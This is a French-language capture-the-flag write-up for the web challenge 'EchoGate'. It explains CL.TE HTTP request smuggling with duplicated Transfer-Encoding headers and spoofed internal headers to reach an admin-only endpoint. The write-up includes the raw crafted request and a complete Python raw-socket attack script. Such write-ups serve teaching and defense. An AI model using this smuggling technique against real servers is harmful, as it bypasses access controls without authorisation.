# EchoGate — request smuggling HTTP (CL.TE)

- **Auteur :** lyons

- **Catégorie :** web
- **Points :** 146
- **Flag :** `CTF{REDACTED}`
- **Service :** `<HOST>:<PORT>` (HTTP/1.1)

## Cadre

Le service met à disposition un endpoint `/api/echo` qui renvoie tel quel ce qui a été placé
dans le body. Il existe par ailleurs un endpoint `/admin/flag`, mais celui-ci n'accepte que
les requêtes internes (contrôle de headers du genre `X-Internal-Request` ou
`X-Forwarded-For`).

Le but : rejoindre `/admin/flag` sans accès direct, en jouant sur une désynchronisation
front-end/back-end quant à l'interprétation de la longueur du corps HTTP.

## Fonctionnement observé

Le serveur traite des requêtes HTTP/1.1 porteuses de `Transfer-Encoding: chunked`. En
poussant un double header `Transfer-Encoding` — l'un valide (`chunked`), l'autre invalide
(`x`) — on obtient un comportement CL.TE (Content-Length vs Transfer-Encoding) :

- Le **front-end** s'appuie sur `Content-Length` pour borner la requête.
- Le **back-end** se fie à `Transfer-Encoding: chunked` et juge le body clos au chunk
  `0\r\n\r\n`.

Tout ce qui dépasse le chunk final est lu par le back-end comme l'**amorce d'une requête
supplémentaire** — la fameuse requête « smugglée ».

## Mise en œuvre

### 1. Élaboration de la requête smugglée

La requête smugglée vise `/admin/flag`, garnie des headers indispensables pour ressembler à
une requête interne :

```
GET /admin/flag HTTP/1.1
Host: <HOST>:<PORT>
X-Internal-Request: true
X-Forwarded-For: 127.0.0.1
Connection: close
```

### 2. L'enveloppe CL.TE

La requête porteuse est un POST à destination de `/api/echo`, équipé d'un double
`Transfer-Encoding` :

```
POST /api/echo HTTP/1.1
Host: <HOST>:<PORT>
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: <TOTAL_BODY_LENGTH>
Connection: close

5\r\n
hello\r\n
0\r\n
\r\n
GET /admin/flag HTTP/1.1\r\n
Host: <HOST>:<PORT>\r\n
X-Internal-Request: true\r\n
X-Forwarded-For: 127.0.0.1\r\n
Connection: close\r\n
\r\n
```

- `Content-Length` embrasse la totalité du body (chunks + requête smugglée).
- Le back-end se stoppe au chunk `0`, honore le POST, puis lit ce qui reste comme un GET
  inédit vers `/admin/flag`.

### 3. Script d'attaque

```python
import socket
import time

HOST = "<HOST>"
PORT = <PORT>
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36"

def main():
    time.sleep(15)
    smuggled = (
        f"GET /admin/flag HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"User-Agent: {UA}\r\n"
        "X-Internal-Request: true\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    body = b"5\r\nhello\r\n0\r\n\r\n" + smuggled
    request = (
        f"POST /api/echo HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"User-Agent: {UA}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: x\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode() + body

    with socket.create_connection((HOST, PORT), timeout=15) as sock:
        sock.sendall(request)
        sock.settimeout(10)
        response = bytearray()
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response.extend(chunk)
        except socket.timeout:
            pass
    print(response.decode(errors="replace"))

if __name__ == "__main__":
    main()
```

### 4. Ce qu'on observe

Deux réponses HTTP se partagent le même flux TCP :

1. `200 OK` — `echo: hello` (la réponse attendue du POST)
2. `200 OK` — le flag (réponse issue de la requête smugglée vers `/admin/flag`)

## Signaux de vulnérabilité

- Serveur HTTP/1.1 placé derrière un reverse proxy ou traité au sein d'un pipeline.
- Des headers `Transfer-Encoding` dupliqués ou malformés sont tolérés.
- L'endpoint admin ne s'appuie que sur des headers (aucune authN réelle).
- Le `time.sleep(15)` du script offre au serveur le délai de traiter la première connexion
  et de « désynchroniser » son parsing — à régler selon le tempo du service.

## Enseignements

- **CL.TE smuggling** : dès que le front-end lit `Content-Length` pendant que le back-end
  lit `Transfer-Encoding`, tout l'excédent après le dernier chunk se retrouve smugglé.
- Les doubles headers `Transfer-Encoding` (l'un valide, l'autre non) forment un vecteur bien
  connu — la RFC 7230 §3.3.3 exige de rejeter la requête, mais nombre de serveurs s'en
  abstiennent.
- Les protections fondées sur des headers (`X-Internal-Request`, `X-Forwarded-For`) tombent
  dès que l'attaquant smuggle ses propres headers.
- Privilégier des sockets raw pour le smuggling — les bibliothèques HTTP remettent les
  headers au propre et bloquent l'émission de requêtes malformées.

## Flag obtenu

```
CTF{REDACTED}
```

---

*Rédaction : **lyons** — BUG|PWN CTF · EchoGate.*
